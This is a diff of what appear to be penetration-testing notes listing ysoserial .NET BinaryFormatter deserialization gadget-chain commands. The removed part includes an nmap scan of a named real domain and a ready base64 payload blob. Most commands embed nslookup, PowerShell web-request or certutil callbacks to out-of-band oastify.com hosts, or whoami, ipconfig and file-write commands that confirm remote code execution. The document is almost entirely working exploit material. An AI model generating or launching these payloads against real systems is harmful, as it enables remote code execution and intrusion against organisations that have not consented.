@@ -1,37 +1,11 @@
-nmap -p- -sV -sC -A superderivatives.com | tee nmap_output.txt
+# GADGET CHAIN 1: ObjectDataProvider (most reliable)
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "nslookup 0ija4dd9o3cls8kd05tgaduy8peg27qw.oastify.com"
 
-# PAYLOAD 1: TextFormattingRunProperties + DNS (BinaryFormatter - base64)
-ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload1.txt
+# GADGET CHAIN 2: WindowsIdentity (works across .NET versions)
+ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "nslookup 0ija4dd9o3cls8kd05tgaduy8peg27qw.oastify.com"
 
-# PAYLOAD 2: WindowsIdentity + DNS (BinaryFormatter - base64)
-ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload2.txt
+# GADGET CHAIN 3: ActivitySurrogateSelector (complex nested gadget)
+ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "nslookup 0ija4dd9o3cls8kd05tgaduy8peg27qw.oastify.com" 
 
-# PAYLOAD 3: ActivitySurrogateSelector + DNS (BinaryFormatter - base64)
-ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload3.txt
-
-# PAYLOAD 4: TextFormattingRunProperties + HTTP callback (BinaryFormatter - base64)
-ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "powershell.exe -c Invoke-WebRequest http://fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload4.txt
-
-# PAYLOAD 5: TextFormattingRunProperties + hex format (for binary transmission)
-ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o hex -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload5.txt
-
-# PAYLOAD 6: WindowsIdentity + cert command (BinaryFormatter - base64)
-ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "certutil.exe -ping fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload6.txt
-
-# PAYLOAD 7: ActivitySurrogateSelector + PowerShell DNS (BinaryFormatter - base64)
-ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "powershell.exe -c [System.Net.Dns]::GetHostAddresses('fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com')" > payload7.txt
-
-# PAYLOAD 8: TextFormattingRunProperties + whoami (BinaryFormatter - base64)
-ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "whoami" > payload8.txt
-
-# PAYLOAD 9: WindowsIdentity + ipconfig (BinaryFormatter - base64)
-ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "ipconfig /all" > payload9.txt
-
-# PAYLOAD 10: TextFormattingRunProperties + raw cmd with canary (BinaryFormatter - base64)
-ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "cmd.exe /c nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com" > payload10.txt
-
-
-
-ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "nslookup fziplsuo5it09n1shkavrsbdp4vvjl7a.oastify.com"
-
-AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA5AU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIG5zbG9va3VwIGZ6aXBsc3VvNWl0MDluMXNoa2F2cnNiZHA0dnZqbDdhLm9hc3RpZnkuY29tIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=
+# BONUS: File write test (if DNS callback unreachable)
+ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "cmd.exe /c echo RCE_CONFIRMED_125766 > C:\temp\pwned.txt"
